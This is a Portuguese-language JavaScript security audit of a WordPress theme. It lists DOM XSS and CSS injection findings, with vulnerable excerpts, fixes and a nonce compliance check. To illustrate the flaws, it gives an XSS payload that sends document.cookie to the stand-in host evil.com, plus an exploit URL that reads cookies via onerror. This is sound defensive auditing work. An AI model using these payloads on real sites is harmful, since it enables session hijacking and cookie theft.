# Relatório de Auditoria JavaScript — UENF Theme
**Auditor:** Bruno (JS Security Auditor)
**Data:** 2026-04-14
**Escopo:** js/*.js (36 arquivos), JS inline em header.php/footer.php, wp_localize_script/wp_add_inline_script em functions.php e includes

---

## Resumo Executivo

| Severidade | Qtd |
|---|---|
| Crítico | 2 |
| Alto | 3 |
| Médio | 5 |
| Baixo | 4 |
| Informativo | 3 |
| **Total** | **17** |

---

## Vulnerabilidades Encontradas

| ID | Arquivo:Linha | Tipo | Severidade | CVSS | Descrição |
|----|--------------|------|-----------|------|-----------|
| SEC-JS-001 | `js/advanced-search.js:292-313` | DOM XSS via template literal | **Crítico** | 8.2 | `createResultHTML()` interpola campos do servidor sem escape no DOM |
| SEC-JS-002 | `js/advanced-search.js:229-245` | DOM XSS via parâmetro URL | **Crítico** | 7.5 | `highlightSearchTerms()` insere `?s=` sem escape HTML via `.html()` |
| SEC-JS-003 | `js/advanced-search.js:399` | XSS via showError | **Alto** | 6.5 | `response.data.message` inserido via template literal em `.html()` |
| SEC-JS-004 | `js/admin/reset-manager.js:307` | XSS em notificação admin | **Alto** | 5.5 | Concatenação direta de `message` em HTML jQuery |
| SEC-JS-005 | `js/extensions-manager.js:143,537` | XSS em showNotification | **Alto** | 5.0 | Template literal com `message` em HTML; padrão inseguro |
| SEC-JS-006 | `js/customizer-search-preview.js:631` | CSS Injection | **Médio** | 5.3 | `$('head').append('<style>' + newval + '</style>')` |
| SEC-JS-007 | `js/advanced-search.js:229` | Open Redirect potencial | **Médio** | 4.3 | `getSearchTerm()` lê `window.location.search` sem validar domínio |
| SEC-JS-008 | `js/search-retractable.js` | console.log em produção | **Baixo** | 2.0 | 7 ocorrências expondo estado interno |
| SEC-JS-009 | `js/custom-search.js` | console.log em produção | **Baixo** | 2.0 | Múltiplos logs expondo estrutura DOM |

---

## Detalhes das Vulnerabilidades Críticas e Altas

### SEC-JS-001 — DOM XSS via createResultHTML — CRÍTICO (CVSS 8.2)

**Arquivo:** `js/advanced-search.js`, linhas 292–313

**Código vulnerável:**
```js
createResultHTML: function(result) {
    return `<div class="search-result">
        <a href="${result.permalink}">${result.title}</a>
        <span>${result.site_name}</span>
        <p>${result.excerpt}</p>  // ← sem escape HTML
    </div>`;
}
// depois:
$container.append(resultHTML); // ← DOM XSS se resultado vier com HTML malicioso
```

**Vetor principal:** `result.excerpt` — um excerpt com `<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` seria executado.

**Código corrigido:**
```js
function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

createResultHTML: function(result) {
    var $div = $('<div class="search-result"></div>');
    var $link = $('<a></a>').attr('href', escapeHtml(result.permalink)).text(result.title);
    var $site = $('<span></span>').text(result.site_name);
    var $excerpt = $('<p></p>').text(result.excerpt);
    return $div.append($link).append($site).append($excerpt);
}
```

---

### SEC-JS-002 — DOM XSS via highlightSearchTerms com parâmetro URL — CRÍTICO (CVSS 7.5)

**Arquivo:** `js/advanced-search.js`, linhas 229–245

**Código vulnerável:**
```js
const searchTerm = this.getSearchTerm(); // lê window.location.search (?s=)
const highlighted = content.replace(
    new RegExp('(' + searchTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'),
    '<mark class="search-highlight">$1</mark>'
);
$element.html(highlighted); // ← DOM XSS
```

O `replace()` escapa metacaracteres **regex** mas **não HTML**. Um `?s=<script>alert(1)</script>` passa intacto.

**Vetor de exploração:**
```
https://uenf.br/?s=<img+src=x+onerror=alert(document.cookie)>
```

**Código corrigido:**
```js
function escapeHtml(str) {
    var div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

const safeTerm = escapeHtml(searchTerm);
const highlighted = escapeHtml(content).replace(
    new RegExp('(' + safeTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi'),
    '<mark class="search-highlight">$1</mark>'
);
$element.html(highlighted);
```

---

### SEC-JS-003 — XSS via showError com dados do servidor — ALTO (CVSS 6.5)

**Arquivo:** `js/advanced-search.js`, linha 399

**Código vulnerável:**
```js
showError: function(message) {
    $('.search-results').html(`<div class="search-error">${message}</div>`);
},
// chamado como:
this.showError('Erro na busca: ' + response.data.message);
```

**Código corrigido:**
```js
showError: function(message) {
    var $error = $('<div class="search-error"></div>').text(message);
    $('.search-results').empty().append($error);
},
```

---

### SEC-JS-004 — XSS em notificação admin (reset-manager) — ALTO (CVSS 5.5)

**Arquivo:** `js/admin/reset-manager.js`, linha 307

**Código vulnerável:**
```js
var $message = $('<div class="uenf-reset-message uenf-message-' + type + '">' + message + '</div>');
```

**Código corrigido:**
```js
var safeType = type.replace(/[^a-z0-9-]/gi, '');
var $message = $('<div></div>')
    .addClass('uenf-reset-message uenf-message-' + safeType)
    .text(message);
```

---

### SEC-JS-005 — XSS em showNotification/showSuccessMessage — ALTO (CVSS 5.0)

**Arquivo:** `js/extensions-manager.js`, linhas 143 e 537

**Código vulnerável:**
```js
// linha 143:
const notification = $('<div class="cct-notification cct-notification-' + type + '">' + message + '</div>');
// linha 537:
const $message = $(`<div class="cct-success-message">${message}</div>`);
```

**Código corrigido:**
```js
// linha 143:
const notification = $('<div></div>')
    .addClass('cct-notification cct-notification-' + type.replace(/[^a-z0-9-]/gi, ''))
    .text(message);
// linha 537:
const $message = $('<div class="cct-success-message"></div>').text(message);
```

---

### SEC-JS-006 — CSS Injection no preview do Customizer — MÉDIO (CVSS 5.3)

**Arquivo:** `js/customizer-search-preview.js`, linha 631

**Código vulnerável:**
```js
$('head').append('<style id="cct-search-custom-css">' + newval + '</style>');
```

**Código corrigido:**
```js
var styleEl = document.getElementById('cct-search-custom-css');
if (!styleEl) {
    styleEl = document.createElement('style');
    styleEl.id = 'cct-search-custom-css';
    document.head.appendChild(styleEl);
}
styleEl.textContent = newval; // textContent previne injeção HTML/JS
```

---

## Conformidade de CSRF/AJAX ✓

Todos os endpoints AJAX auditados utilizam nonces WordPress corretamente:

| Script | Objeto localizado | Nonce |
|---|---|---|
| `js/advanced-search.js` | `cctSearch` | `wp_create_nonce('cct_search_nonce')` |
| `js/form-validator.js` | `uenfFormValidator` | `wp_create_nonce('uenf_form_validation_nonce')` |
| `js/admin/reset-manager.js` | `uenfResetManager` | `wp_create_nonce(...)` |
| `js/css-editor.js` | `cctCssEditor` | Nonce presente |
| `js/cct-dark-mode.js` | `cctDarkMode` | Nonce presente |

**Nenhuma ocorrência encontrada:**
- `eval()`, `new Function()`, `setTimeout(string)` ✓
- `window.location = userInput` sem validação ✓
- `jQuery.extend(true, ...)` com dados de usuário (Prototype Pollution) ✓
- Credenciais hardcoded ✓
- `localStorage` com dados sensíveis de sessão ✓

---

## Arquivos JS verificados sem issues

`js/main.js`, `js/accessibility.js`, `js/back-to-top.js`, `js/cct-dark-mode.js`, `js/form-validator.js`, `js/language-switcher.js`, `js/mobile-search.js`, `js/offcanvas-menu.js`, `js/shortcut-panel.js`, `js/css-editor.js`, `js/admin/customizer.js`, `js/admin/extensions-manager.js` (padrão inseguro em showNotification — SEC-JS-005 — mas strings atuais são literais), `js/cct-lazyload.js`, `js/uenf-hero.js`.

JS inline em `header.php`: sem issues (manipulação DOM com `.className`, `.classList`, sem innerHTML com dados externos).
